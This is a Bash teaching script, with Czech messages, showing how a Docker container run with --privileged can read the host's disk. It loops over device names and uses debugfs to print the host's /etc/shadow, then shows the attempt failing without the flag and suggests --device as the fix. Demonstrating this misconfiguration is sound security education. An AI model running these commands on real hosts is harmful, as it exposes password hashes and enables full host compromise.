#!/usr/bin/env bash
# 02 — ÚNIK #2: --privileged → připojení disku hostitele → čtení /etc/shadow.
# Klíčová ukázka ze zadání: proč je --privileged tak nebezpečný.
set -euo pipefail
source "$(dirname "$0")/lib.sh"
require_docker

bad "Scénář: kontejner běží s --privileged (vývojáři to často dají 'aby to fungovalo')."
say "--privileged zpřístupní VŠECHNA zařízení /dev hostitele a vypne většinu ochran."
pause

echo
say "1) Uvnitř privileged kontejneru vidíme disky hostitele:"
run docker run --rm --privileged alpine:3.19 sh -c 'apk add --no-cache util-linux >/dev/null 2>&1; fdisk -l 2>/dev/null | grep -E "Disk /dev|Linux" | head'
pause

echo
say "2) Přečteme /etc/shadow hostitele PŘÍMO z disku pomocí debugfs (bez mountování):"
echo "   (živý kořenový oddíl nejde znovu připojit; debugfs čte ext4 read-only přímo ze zařízení)"
cat <<'EOS'
$ docker run --rm --privileged alpine:3.19 sh -c '
    apk add --no-cache e2fsprogs-extra >/dev/null 2>&1
    debugfs -R "cat /etc/shadow" /dev/sda1'   # čte ext4 přímo, read-only, bez mountu
EOS
docker run --rm --privileged alpine:3.19 sh -c '
  apk add --no-cache e2fsprogs-extra >/dev/null 2>&1
  for d in /dev/sda1 /dev/vda1 /dev/xvda1 /dev/nvme0n1p1 /dev/sda2 /dev/vda2; do
    [ -b "$d" ] || continue
    if debugfs -R "cat /etc/shadow" "$d" 2>/dev/null | grep -q ":"; then
      echo "# čteno z $d přes debugfs (BEZ mountování, read-only):"
      debugfs -R "cat /etc/shadow" "$d" 2>/dev/null | head -n 5
      exit 0
    fi
  done
  echo "debugfs nenašel /etc/shadow — ověř název zařízení (fdisk -l) nebo typ FS"' \
  || warn "Pokud selhalo: ověř, že se nainstaloval e2fsprogs-extra a sedí zařízení."
echo
bad "Root v privileged kontejneru = root na hostiteli. Kompletní kompromitace."
pause

echo
good "Obrana: NIKDY --privileged. Stejný debugfs útok bez něj selže:"
echo "  docker run --rm alpine:3.19 debugfs -R 'cat /etc/shadow' /dev/sda1"
run docker run --rm alpine:3.19 sh -c 'apk add --no-cache e2fsprogs-extra >/dev/null 2>&1; debugfs -R "cat /etc/shadow" /dev/sda1 2>&1 | head -2; echo "→ /dev/sda1 v kontejneru BEZ --privileged vůbec není"'
good "Bez --privileged chybí přístup k zařízením hostitele. Když appka potřebuje jedno konkrétní, přidej ho cíleně přes --device, ne plošně --privileged."
